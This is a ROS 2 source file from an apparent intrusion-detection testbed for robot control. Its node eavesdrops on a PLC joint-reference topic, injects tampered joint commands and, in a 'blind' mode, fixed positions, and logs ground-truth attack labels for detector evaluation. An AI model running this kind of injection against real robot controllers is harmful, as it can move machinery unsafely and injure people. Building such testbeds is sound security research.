from rclpy.node import Node

from ids_attacks.library import AttackSchedule
from ids_experiments.reports import NodeReport
from ids_experiments.rogue import blind_position, HOME, MARK, stamp_of
from ids_experiments.scenario import load_scenario
from ids_experiments.shutdown import init, spin_until_shutdown, StopFlag
from ids_interfaces.msg import AttackTruth, JointReference


def truth_message(header, truth):
    msg = AttackTruth()
    msg.header = header
    msg.implant_active = True
    msg.attack_active = truth.attack_active
    msg.kind = truth.kind
    msg.joint_mask = list(truth.joint_mask)
    msg.magnitude = float(truth.magnitude)
    msg.event_id = int(truth.event_id)
    return msg


class RogueInjector(Node):

    def __init__(self, clock=None):
        super().__init__('rogue')
        self.declare_parameter('scenario_file', '')
        self.declare_parameter('listen_topic', '/plc/reference')
        self.declare_parameter('target_topic', '/plc/reference')
        self.declare_parameter('truth_topic', '/attack/truth')
        self.declare_parameter('rate', 100.0)
        self.declare_parameter('blind', True)
        self.declare_parameter('blind_after', 1.0)
        self.declare_parameter('home', list(HOME))
        self.declare_parameter('report_file', '')
        path = self.get_parameter('scenario_file').value
        scenario = load_scenario(path) if path else None
        attacks = scenario.attacks if scenario else ()
        self._schedule = AttackSchedule(attacks)
        self._blind_q = blind_position(self.get_parameter('home').value, attacks)
        self._blind = bool(self.get_parameter('blind').value)
        self._blind_after = float(self.get_parameter('blind_after').value)
        self._wall = clock or (lambda: self.get_clock().now().nanoseconds * 1e-9)
        self._t0 = None
        self._last_trusted = None
        self._last_wall = None
        self._seq = 0
        self.report = NodeReport(self.get_parameter('report_file').value, 'rogue', {
            'scenario': scenario.name if scenario else '',
            'listen_topic': self.get_parameter('listen_topic').value,
            'target_topic': self.get_parameter('target_topic').value})
        self._target = self.create_publisher(
            JointReference, self.get_parameter('target_topic').value, 100)
        self._truth = self.create_publisher(
            AttackTruth, self.get_parameter('truth_topic').value, 100)
        self._listen = self.create_subscription(
            JointReference, self.get_parameter('listen_topic').value, self._on_trusted, 100)
        self.create_timer(1.0 / float(self.get_parameter('rate').value), self._tick)
        self.get_logger().warn(
            f"rogue node up: listening on {self.get_parameter('listen_topic').value}, injecting "
            f"on {self.get_parameter('target_topic').value}")

    def _publish(self, msg, kind):
        msg.header.frame_id = MARK
        self._target.publish(msg)
        self.report.count(kind)

    def _on_trusted(self, msg):
        if msg.header.frame_id == MARK:
            self.report.count('own_samples_seen')
            return
        self.report.count('received_trusted')
        stamp = stamp_of(msg)
        if self._t0 is None:
            self._t0 = stamp
            self.get_logger().warn(f'eavesdropping: first trusted sample at t={stamp:.3f} s')
        self._last_trusted = msg
        self._last_wall = self._wall()
        q, v, a, truth = self._schedule.apply(stamp - self._t0, msg.position, msg.velocity,
                                              msg.acceleration)
        if not truth.attack_active:
            return
        out = JointReference()
        out.header.stamp = msg.header.stamp
        out.seq = msg.seq
        out.position, out.velocity, out.acceleration = q.tolist(), v.tolist(), a.tolist()
        out.payload_context = msg.payload_context
        out.payload_mass = msg.payload_mass
        self._publish(out, 'injected_tampered')
        self._truth.publish(truth_message(out.header, truth))

    def _tick(self):
        quiet = self._last_wall is None or self._wall() - self._last_wall > self._blind_after
        if self._blind and quiet:
            out = JointReference()
            if self._last_trusted is not None:
                out.header.stamp = self._last_trusted.header.stamp
            out.seq = self._seq
            out.position = self._blind_q.tolist()
            out.velocity = [0.0] * 7
            out.acceleration = [0.0] * 7
            self._seq += 1
            self._publish(out, 'injected_blind')
        self.report.observe('target_subscribers', self._target.get_subscription_count())
        self.report.observe('listen_publishers', self._listen.get_publisher_count())
        self.report.maybe_write()


def main(args=None):
    init(args=args)
    stop = StopFlag()
    node = RogueInjector()
    try:
        spin_until_shutdown(node, stop=stop)
    finally:
        node.report.write(final=True)